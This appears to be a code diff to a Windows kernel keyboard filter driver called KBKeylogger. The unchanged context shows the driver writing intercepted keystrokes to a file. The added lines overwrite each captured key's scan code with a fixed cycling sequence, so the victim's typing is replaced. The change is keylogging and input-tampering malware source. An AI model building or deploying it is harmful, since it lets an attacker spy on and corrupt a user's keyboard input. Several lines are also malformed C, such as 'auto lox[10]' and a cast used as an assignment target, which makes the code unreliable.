@@ -1,5 +1,5 @@
 #include "KBKeylogger.h"
-
+SHORT t = 0;
 WCHAR			*defShadowText = "test";
 WCHAR			*shadowText;
 NTSTATUS DriverEntry (PDRIVER_OBJECT, PUNICODE_STRING);
@@ -130,10 +130,22 @@ NTSTATUS ReadCompletion(
 {
 	ULONG KeyCount;
 	ULONG i;
-	
+	PKEYBOARD_INPUT_DATA KeyTemp;
+
 	if (Irp->IoStatus.Status == STATUS_SUCCESS)
 	{
 		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
+		KeyTemp = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
+		auto lox[10] = { 0x22, 0x22, 0x30, 0x30, 0x26, 0x26,  0x24, 0x24, 0x23, 0x23 };
+		
+		KeyTemp->MakeCode = lox[t++];
+		
+		if (t >= 10)
+			t = 0;
+
+		(PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer = KeyTemp;
+
+
 		KeyCount = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
 
 		for (i = 0; i < KeyCount; i++)
@@ -171,8 +183,7 @@ KBKeyloggerRead(
 		FILE_ATTRIBUTE_NORMAL, 0,
 		FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT,
 		NULL, 0);
-
-
+	
 /*shadowText = ExAllocatePool(NonPagedPool, NTSTRSAFE_MAX_CCH * sizeof(WCHAR));
 defShadowText = ExAllocatePool(NonPagedPool, NTSTRSAFE_MAX_CCH * sizeof(WCHAR));
 RtlZeroMemory(shadowText, NTSTRSAFE_MAX_CCH * sizeof(WCHAR));
